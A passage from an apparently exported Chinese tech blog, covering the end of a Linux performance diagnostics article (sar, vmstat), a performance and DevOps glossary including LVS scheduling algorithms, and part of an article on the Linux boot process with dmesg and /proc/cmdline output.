<p>输出参数：</p>
<ul>
<li>pswpin/s:每秒系统换入的页面数</li>
<li>pswpout/s:每秒系统换出的页面数</li>
</ul>
<p><strong>发生频繁的交换时，服务器的吞吐量性能会大幅下降。</strong></p>
<h4 id="vmstat-Report-Virtual-Memory-Statistics"><a href="#vmstat-Report-Virtual-Memory-Statistics" class="headerlink" title="vmstat(Report Virtual Memory Statistics)"></a>vmstat(Report Virtual Memory Statistics)</h4><p>实时确认CPU使用率及实际的I/O等待时间<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ vmstat</span><br><span class="line"> kthr      memory            page            disk          faults      cpu</span><br><span class="line"> r b w   swap  <span class="built_in">free</span>  re  mf pi po fr de sr s2 s2 s2 s2   in   sy   cs us sy id</span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">45411448</span> <span class="number">17973032</span> <span class="number">140</span> <span class="number">1470</span> <span class="number">13</span> <span class="number">41</span> <span class="number">33</span> <span class="number">0</span> <span class="number">0</span> <span class="number">-0</span> <span class="number">-0</span> <span class="number">-0</span> <span class="number">-0</span> <span class="number">2753</span> <span class="number">313459</span> <span class="number">4984</span> <span class="number">16</span> <span class="number">3</span> <span class="number">81</span></span><br></pre></td></tr></table></figure></p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>优化的真正工作是“找出系统瓶颈并加以解决”，我们所能做的就是“充分发挥硬／软件本来的性能，解决可能存在的问题”。例如，同样是I/O问题，我们可以通过增加内存来缓解，也可以调整调度方案来优化（时间换空间），但是更多的情况是，优化应用程序的I/O算法效果更佳。</p>
<p>最后，重温一句经典格言</p>
<blockquote>
<p>别臆断，请监控</p>
</blockquote>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-Perf-WordBook</title>
    <url>/2017/12/23/Linux-Perf-WordBook/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<p><strong>dynamic tracing，动态追踪技术</strong></p>
<blockquote>
<p>kk</p>
</blockquote>
<h3 id="指标"><a href="#指标" class="headerlink" title="指标"></a>指标</h3><p><strong>IOPS</strong></p>
<blockquote>
<p>每秒的I/O操作数</p>
</blockquote>
<p><strong>吞吐量</strong></p>
<blockquote>
<p>评价执行速率。<br>数据传输：字节／秒或比特／秒<br>数据库：秒操作数，秒业务数</p>
</blockquote>
<p><strong>延迟</strong></p>
<blockquote>
<p>描述操作里等待服务的时间。某些情况下等同于响应时间。</p>
</blockquote>
<h4 id="使用率"><a href="#使用率" class="headerlink" title="使用率"></a><strong>使用率</strong></h4><blockquote>
<p>给定时间区间内，资源的繁忙程度。如内存使用率。<br>非空闲时间（Brendan定义）</p>
</blockquote>
<p>1.基于时间：<br>  U=B/T<br>U是使用率，B是T时间内系统繁忙时间，T是观测周期。</p>
<p>2.基于容量：</p>
<p><strong>observer effect ,观测者效应</strong>：指标的获取不是免费的。</p>
<hr>
<p><strong>响应时间</strong></p>
<blockquote>
<p>一次操作完成的时间。包括用于等待和服务的时间。</p>
</blockquote>
<p><strong>饱和度</strong></p>
<blockquote>
<p>指的是某一资源无法满足服务的排队工作量。<br>随着工作量增加而对资源的请求超过资源所能处理的程度。</p>
</blockquote>
<p><strong>瓶颈</strong></p>
<blockquote>
<p>限制性资源。</p>
</blockquote>
<p><strong>工作负载</strong></p>
<blockquote>
<p>系统的输入、输出对系统所施加的负载叫工作负载。<br>如数据库的工作负载就是客户端发出的请求和指令。</p>
</blockquote>
<p><strong>缓存</strong></p>
<blockquote>
<p>用于复制或存储一定量数据的高速存储区域。<br>ps:相对概念。只要存在高低速差，即可视为广义缓存？</p>
</blockquote>
<p>1.冷：填充的数据为空，或填充无用的数据，命中率为0<br>2.热：填充的都是常用数据<br>3.温：命中率还没有达到理想的高度<br>4.热度：</p>
<h2 id="P"><a href="#P" class="headerlink" title="P"></a>P</h2><p><strong>Profiling 剖析</strong></p>
<p><strong>Perturbation 扰动</strong></p>
<blockquote>
<p>同义词：</p>
</blockquote>
<p><strong>ROI 投资回报率</strong></p>
<blockquote>
<p>性能技术取决于投资回报率！<br>横跨大西洋连接纽约交易所和伦敦交易所的光缆，预算3亿美金，用以减少6ms的传输时延</p>
</blockquote>
<p><strong>SUT,system under test 受测系统</strong></p>
<h2 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h2><p>分类：信息收集、观测分析、容量规划、统计分析、调优、实验分析</p>
<h3 id="USE方法-（utilization-saturation-errors）"><a href="#USE方法-（utilization-saturation-errors）" class="headerlink" title="USE方法 （utilization,saturation,errors）"></a>USE方法 （utilization,saturation,errors）</h3><p>for(资源;所有资源;i++){<br>  1.出现错误？<br>  2.使用率高？<br>  3.饱和？<br>}</p>
<h1 id="Scheduling-Algorithm-调度算法"><a href="#Scheduling-Algorithm-调度算法" class="headerlink" title="Scheduling Algorithm 调度算法"></a>Scheduling Algorithm 调度算法</h1><div class="table-container">
<table>
<thead>
<tr>
<th><strong>Code</strong></th>
<th><strong>Name</strong></th>
<th><strong>名称</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>RR</td>
<td><strong>round－robin</strong></td>
<td>轮询调度</td>
<td>单纯依次请求真实服务器。均等分发</td>
</tr>
<tr>
<td>WRR</td>
<td><strong>weighted round-robin</strong></td>
<td>加权轮询调度</td>
<td>引入加权值来控制分发比率。</td>
</tr>
<tr>
<td>LC</td>
<td><strong>least-connection</strong></td>
<td>最小连接调度</td>
<td>将新的请求连接到当前连接数最少的服务器</td>
</tr>
<tr>
<td>WLC</td>
<td><strong>weighted least-connection</strong></td>
<td>加权最小连接调度</td>
<td>（连接数＋1）／加权值。</td>
</tr>
<tr>
<td>SED</td>
<td><strong>shortest expected delay</strong></td>
<td>最短预期延时调度</td>
<td>选择响应速度最快的那台服务器，选择状态ESTABLISHED的连接数最少的服务器。与WLC类似，但WLC会把TIME_WAIT或FIN_WAIT的连接数计算在最小因素中</td>
</tr>
<tr>
<td>NQ</td>
<td><strong>never queue</strong></td>
<td>不排队调度</td>
<td>最优先选择连接数为0的服务器</td>
</tr>
<tr>
<td>SH</td>
<td><strong>source hashing</strong></td>
<td>源地址散列调度</td>
<td>对发出请求的IP地址计算散列值</td>
</tr>
<tr>
<td>DH</td>
<td><strong>destination hashing</strong></td>
<td>目标地址散列调度</td>
<td>对需要接收请求的目标地址计算散列值</td>
</tr>
<tr>
<td>LBLC</td>
<td><strong>locality-based least-connection</strong></td>
<td>基于局部性的最小连接</td>
<td>在连接数没有超过加权值指定的值时，将选择同一台服务器</td>
</tr>
<tr>
<td>LBLCR</td>
<td><strong>locality-based least-connection with replication</strong></td>
<td>带复制的基于局部性最小连接</td>
<td>当所有服务器的连结数都超过加权值指定的值时，将选择连接数最少的那台服务器</td>
</tr>
</tbody>
</table>
</div>
<h1 id="DevOps-WordBook"><a href="#DevOps-WordBook" class="headerlink" title="DevOps-WordBook"></a>DevOps-WordBook</h1><h2 id="A"><a href="#A" class="headerlink" title="A"></a>A</h2><p><strong>Availability</strong> () [可用性]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统停止的可能性。</span><br></pre></td></tr></table></figure></p>
<p><strong>Algorithm</strong>()[算法]</p>
<p><a href="SchedulingAlgorithm.md">Scheduling Algorithm 调度算法</a></p>
<h2 id="B"><a href="#B" class="headerlink" title="B"></a>B</h2><p><strong>Bottleneck</strong> () [瓶颈]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阻碍系统整体性能提升的地方。</span><br></pre></td></tr></table></figure></p>
<h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><p><strong>CDN</strong> (Content Delivery Network) [内容分发网络]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从散布在全世界的缓存服务器中，选择离客户端较近的服务器来发送信息，据此实现性能的提升</span><br></pre></td></tr></table></figure></p>
<h2 id="D"><a href="#D" class="headerlink" title="D"></a>D</h2><p><strong>DC</strong> (Data Center) [数据中心]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">容纳服务器设备。配备空调，冗余电源。配备火灾、地震等应急措施。</span><br></pre></td></tr></table></figure></p>
<p><strong>Daemon</strong> () [守护程序]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在后台持续运行并发挥作用。</span><br></pre></td></tr></table></figure></p>
<h2 id="E"><a href="#E" class="headerlink" title="E"></a>E</h2><p><strong>Environment</strong> () [环境]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Production Environment 生产环境</span><br><span class="line">Staging Environment  准生产环境</span><br></pre></td></tr></table></figure></p>
<h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><p><strong>Failover</strong> () [故障转移]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在冗余系统中，活动节点（Active Node）停止时，自动切换到备用节点（Backup Node）.</span><br><span class="line">如果不是自动切换，而是手动，通常叫作Switchover.</span><br></pre></td></tr></table></figure><br><strong>Failback</strong> ()[故障恢复]</p>
<p><strong>File System</strong> () [文件系统]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分类：</span><br><span class="line">Memory File System:建立在内存中的文件系统</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="G"><a href="#G" class="headerlink" title="G"></a>G</h2><p><em>**</em> () []<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="H"><a href="#H" class="headerlink" title="H"></a>H</h2><p><strong>Health Check</strong> () [健康检查]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">确认检查对象的状态是否正常。</span><br><span class="line">例如：确认服务器是否能响应ping,是否能应答HTTP等。</span><br></pre></td></tr></table></figure></p>
<h2 id="I"><a href="#I" class="headerlink" title="I"></a>I</h2><p><em>**</em> () []<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="J"><a href="#J" class="headerlink" title="J"></a>J</h2><p><em>**</em> () []<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="K"><a href="#K" class="headerlink" title="K"></a>K</h2><p><strong>Keepalived</strong> () [内容分发网络]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.keepalived.org</span><br></pre></td></tr></table></figure></p>
<h2 id="L"><a href="#L" class="headerlink" title="L"></a>L</h2><p><strong>LVS</strong> (Linux Virtual Server) [Linux虚拟服务器]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原伟项目名，旨在搭建具有可扩展性的、实用性高的系统。</span><br><span class="line">http://www.linuxvirtualserver.org</span><br></pre></td></tr></table></figure></p>
<p><strong>Load Balancer</strong> () [负载均衡器]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位于客户端和服务器之间，将客户端的请求分散到后端的多台服务器。</span><br><span class="line">Load［负载］大致力可分为“CPU负载”和“IO负载”。详见：http://www.jianshu.com/p/db8e8a2884ef</span><br></pre></td></tr></table></figure></p>
<p><strong>Latency</strong> () [延迟]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通常指数据投递完成所花费的时间。</span><br></pre></td></tr></table></figure></p>
<h2 id="M"><a href="#M" class="headerlink" title="M"></a>M</h2><p><em>**</em> () []<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
<h2 id="N"><a href="#N" class="headerlink" title="N"></a>N</h2><p><strong>NIC</strong> (Network Interface Card) [网络接口卡，网卡]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络接口的总称</span><br></pre></td></tr></table></figure></p>
<p><strong>Netfilter</strong><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux内核中操作网络数据包所需的协议框架。</span><br><span class="line">实现分组过滤的iptables和负载均衡的IPVS也应用了Netfilter协议。</span><br></pre></td></tr></table></figure></p>
<h2 id="O"><a href="#O" class="headerlink" title="O"></a>O</h2><p><strong>OSI</strong> (Open Systems Interconnection) [参考模型]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分为七层（Layer）框架，例如：</span><br><span class="line">第七层：应用层。HTTP及SMT等协议</span><br><span class="line">第四层：传输层。TCP及UDP</span><br><span class="line">第三层：网络层。IP、ARP及ICMP</span><br><span class="line">第二层：数据链路层。以太网等</span><br></pre></td></tr></table></figure></p>
<p><strong>OSS</strong> (OpenSource Software) [开源软件]<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">## P</span><br><span class="line"></span><br><span class="line">**Proxy** () [代理]</span><br></pre></td></tr></table></figure><br>Transparent Proxy:透明代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Q</span><br><span class="line"></span><br><span class="line">**** () []</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## R</span><br><span class="line"></span><br><span class="line">**Redundancy** () [冗余]</span><br></pre></td></tr></table></figure>
<p>将系统的构成要素配置多个，即使其中一个发生故障而停止运作，也可以切换到备用设备以使服务不停止。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**Resource** () [资源]</span><br></pre></td></tr></table></figure><br>指CPU,内存，磁盘空间等<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## S</span><br><span class="line"></span><br><span class="line">**Scalability** () [可扩展性]</span><br></pre></td></tr></table></figure><br>随着用户的增多以及规模的扩大，在某种程度上扩展系统以加强应对的能力。<br>Scale-out:横向扩展。例如：将服务分摊到多台服务器<br>Scale-up:纵向扩展。 例如：提升单个服务器性能<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">**SPO** (Single Point of Failure) [单点故障]</span><br></pre></td></tr></table></figure><br>若此处出现问题，就会令整个系统停止，即系统要害。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## T</span><br><span class="line"></span><br><span class="line">**Throughput** () [吞吐量]</span><br></pre></td></tr></table></figure><br>代表单位时间的传送量。<br>例如：大巴车和小汽车。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## U</span><br><span class="line"></span><br><span class="line">**** () []</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## V</span><br><span class="line"></span><br><span class="line">**VIP** (Virtual IP Address) [虚拟IP地址]</span><br></pre></td></tr></table></figure>
<p>浮动分配给某项服务或功能的IP地址。例如负载均衡器中接收客户端请求的IP地址。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## W</span><br><span class="line"></span><br><span class="line">**** () []</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## X</span><br><span class="line"></span><br><span class="line">**** () []</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## Y</span><br><span class="line"></span><br><span class="line">**** () []</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## Z</span><br><span class="line"></span><br><span class="line">**** () []</span><br></pre></td></tr></table></figure>
<p>```</p>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>How Linux Works:Boots</title>
    <url>/2017/05/29/Linux-Works-Boots/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、How the Linux Kernel Boots</li>
<li>二、How User Space Starts</li>
<li>三、The Initial RAM filesystem</li>
</ul>
<span id="more"></span>
<blockquote>
<p>史蒂夫·乔布斯（Steve Jobs）：“假设你可以缩短10秒钟的开机时间，把这个乘上500万，那就是每天5000万秒了。一年下来大概是好几十辈子的时间。想想看，如果你可以让开机速度快10秒钟的话，就拯救了数十条生命。这很值得啊，你不觉得吗？”  《硅谷革命：成就苹果公司的疯狂往事》</p>
</blockquote>
<h2 id="How-the-Linux-Kernel-Boots"><a href="#How-the-Linux-Kernel-Boots" class="headerlink" title="How the Linux Kernel Boots"></a>How the Linux Kernel Boots</h2><ol>
<li>The machine’s BIOS or boot firmware loads and runs a boot loader.(Boot Loader 是在操作系统内核运行之前运行的一段小程序，它严重地依赖于硬件而实现)</li>
<li>The boot loader finds the kernel image on disk, loads it into memory, and starts it. （选择内核镜像，加载到内存空间，为最终调用操作系统内核准备好正确的环境。）</li>
<li>The kernel initializes the devices and its drivers.（初始化硬件设备及其驱动程序）</li>
<li>The kernel mounts the root filesystem.（挂载根目录。根目录指文件系统的最上一级目录，它是相对子目录来说的；它如同一棵大树的“根”一般，所有的树杈以它为起点）</li>
<li>The kernel starts a program called init with a process ID of 1. This point is the user space start.（内核启动一个初始化程序，从这里开始虚拟内存开始划分出使用者空间，与内核空间（Kernel space）对应）</li>
<li>init sets the rest of the system processes in motion</li>
<li>At some point, init starts a process allowing you to log in, usually at the end or near the end of the boot.</li>
</ol>
<h4 id="Startup-Messages"><a href="#Startup-Messages" class="headerlink" title="Startup Messages"></a>Startup Messages</h4><p>有两种方式可以查看内核引导和运行诊断信息：</p>
<ol>
<li>查看内核系统日志文件。文件路径： /var/log/kern.log</li>
<li>执行dmesg命令<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@li1437-101 ~]<span class="comment"># dmesg</span></span><br><span class="line">[    0.000000] Linux version 4.9.7-x86_64-linode80 (maker@build) (gcc version 4.7.2 (Debian 4.7.2-5) ) <span class="comment">#2 SMP Thu Feb 2 15:43:55 EST 2017</span></span><br><span class="line">[    0.000000] Command line: root=/dev/sda console=tty1 console=ttyS0 ro  devtmpfs.mount=1</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: <span class="string">&#x27;x87 floating point registers&#x27;</span></span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: <span class="string">&#x27;SSE registers&#x27;</span></span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x004: <span class="string">&#x27;AVX registers&#x27;</span></span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256</span><br><span class="line">[    0.000000] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using <span class="string">&#x27;standard&#x27;</span> format.</span><br><span class="line">[    0.000000] x86/fpu: Using <span class="string">&#x27;eager&#x27;</span> FPU context switches.</span><br><span class="line">[    0.000000] e820: BIOS-provided physical RAM map:</span><br><span class="line">…….</span><br><span class="line"></span><br><span class="line">[    0.000000] NX (Execute Disable) protection: active</span><br><span class="line">[    0.000000] SMBIOS 2.8 present.</span><br><span class="line">[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.9.1-0-gb3ef39f-prebuilt.qemu-project.org 04/01/2014</span><br><span class="line">[    0.000000] Hypervisor detected: KVM</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">[    0.371925] raid6: sse2x1   gen()  7490 MB/s</span><br><span class="line">[    0.428689] raid6: sse2x1   xor()  5953 MB/s</span><br><span class="line">[    0.485463] raid6: sse2x2   gen()  9289 MB/s</span><br><span class="line">[    0.542230] raid6: sse2x2   xor()  6754 MB/s</span><br><span class="line">[    0.599013] raid6: sse2x4   gen() 10954 MB/s</span><br><span class="line">[    0.656189] raid6: sse2x4   xor()  5522 MB/s</span><br><span class="line">[    0.656943] raid6: using algorithm sse2x4 gen() 10954 MB/s</span><br><span class="line">[    0.657588] raid6: .... xor() 5522 MB/s, rmw enabled</span><br><span class="line">……</span><br><span class="line">[    1.053697] Netfilter messages via NETLINK v0.30.</span><br><span class="line">[    1.054471] nfnl_acct: registering with nfnetlink.</span><br><span class="line">[    1.055332] nf_conntrack version 0.5.0 (8192 buckets, 32768 max)</span><br><span class="line">[    1.056324] ctnetlink v0.93: registering with nfnetlink.</span><br><span class="line">[    1.057335] nf_tables: (c) 2007-2009 Patrick McHardy &lt;kaber@trash.net&gt;</span><br><span class="line">[    1.058393] nf_tables_compat: (c) 2012 Pablo Neira Ayuso &lt;pablo@netfilter.org&gt;</span><br><span class="line">[    1.059599] xt_time: kernel timezone is -0000</span><br><span class="line">[    1.060296] ip_set: protocol 6</span><br><span class="line">[    1.060791] IPVS: Registered protocols (TCP, UDP, SCTP, AH, ESP)</span><br><span class="line">[    1.061940] IPVS: Connection <span class="built_in">hash</span> table configured (size=4096, memory=64Kbytes)</span><br><span class="line">[    1.063162] IPVS: Creating netns size=2104 id=0</span><br><span class="line">[    1.064139] IPVS: ipvs loaded.</span><br><span class="line">……</span><br><span class="line">[    1.744221] systemd[1]: Detected virtualization kvm.</span><br><span class="line">[    1.745058] systemd[1]: Detected architecture x86-64.</span><br><span class="line">[    1.747402] systemd[1]: Set hostname to &lt;localhost.localdomain&gt;.</span><br><span class="line">[    1.834328] tsc: Refined TSC clocksource calibration: 2800.119 MHz</span><br><span class="line">[    1.835512] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x285cb16f950, max_idle_ns: 440795333193 ns</span><br><span class="line">[    1.843476] systemd[1]: Created slice Root Slice.</span><br><span class="line">[    1.844251] systemd[1]: Starting Root Slice.</span><br><span class="line">[    1.845835] systemd[1]: Created slice System Slice.</span><br><span class="line">[    1.846631] systemd[1]: Starting System Slice.</span><br><span class="line">[    1.848257] systemd[1]: Listening on udev Kernel Socket.</span><br><span class="line">[    1.849119] systemd[1]: Starting udev Kernel Socket.</span><br><span class="line">[    2.014715] EXT4-fs (sda): re-mounted. Opts: (null)</span><br><span class="line">[    2.038202] systemd-journald[2010]: Received request to flush runtime journal from PID 1</span><br><span class="line">[    2.241341] audit: <span class="built_in">type</span>=1305 audit(1488188850.897:2): audit_pid=2215 old=0 auid=4294967295 ses=4294967295 res=1</span><br><span class="line">[    2.287758] Adding 262140k swap on /dev/sdb.  Priority:-1 extents:1 across:262140k FS</span><br><span class="line">[    2.905177] IPVS: Creating netns size=2104 id=1</span><br><span class="line">[    2.954613] IPv6: ADDRCONF(NETDEV_UP): eth0: link is not ready</span><br><span class="line">[    2.955987] 8021q: adding VLAN 0 to HW filter on device eth0</span><br><span class="line">[    8.009765] random: crng init <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在故障排查中，dmesg信息需要首先查看,例如输出最近10条系统信息,<br>可以查看到引起性能问题的错误。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dmesg | tail</span><br><span class="line">[1880957.563150] perl invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0</span><br><span class="line">[...]</span><br><span class="line">[1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child</span><br><span class="line">[1880957.563408] Killed process 18694 (perl) total-vm:1972392kB, anon-rss:1953348kB, file-r</span><br><span class="line">ss:0kB</span><br><span class="line">[2320864.954447] TCP: Possible SYN flooding on port 7001. Dropping request. Check SNMP cou</span><br><span class="line">nters.</span><br></pre></td></tr></table></figure></p>
<h4 id="Kernel-initialization-and-Boot-Options"><a href="#Kernel-initialization-and-Boot-Options" class="headerlink" title="Kernel initialization and Boot Options"></a>Kernel initialization and Boot Options</h4><p>在启动时，Linux内核初始化的顺序如下：</p>
<ol>
<li>CPU inspection （检查CPU）</li>
<li>Memory inspection （检查内存）</li>
<li>Device bus discovery （发现设备总线）</li>
<li>Device discovery （发现设备）</li>
<li>Auxiliary kernel subsystem setup(networking, and so on) （辅助内核子系统启动，例如网络等）</li>
<li>Root filesystem mount （挂载根目录）</li>
<li>User space start （用户空间启动）</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux_kernel_root_filesystem.png" alt="root filesystem"></p>
<h3 id="Kernel-Parameters"><a href="#Kernel-Parameters" class="headerlink" title="Kernel Parameters"></a>Kernel Parameters</h3><p>文件/proc/cmdline记录了系统内核启动参数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@li1437-101 ~]<span class="comment"># cat /proc/cmdline</span></span><br><span class="line">root=/dev/sda console=tty1 console=ttyS0 ro  devtmpfs.mount=1</span><br></pre></td></tr></table></figure><br>查看运行级别：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@li1437-101 ~]<span class="comment"># who -r</span></span><br><span class="line">		 run-level 3  2017-02-27 09:47</span><br><span class="line">[root@li1437-101 ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
